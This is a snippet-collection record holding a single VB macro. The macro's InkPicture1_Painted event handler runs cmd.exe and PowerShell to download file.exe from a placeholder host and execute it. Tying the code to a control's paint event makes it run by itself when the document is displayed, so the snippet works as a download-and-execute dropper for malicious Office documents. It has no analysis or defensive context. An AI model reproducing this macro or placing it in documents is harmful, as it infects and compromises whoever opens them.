---
id: 4dc009aa-0a67-43e4-9e2c-ba7eb4a6beb3
type: code
language: vb
verified: false
created_at: '2023-04-06T03:56:23.729835+00:00'
updated_at: '2023-04-10T20:36:58.016275+00:00'
---

# Code Snippet 4dc009aa

**Language**: vb

```vb
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```
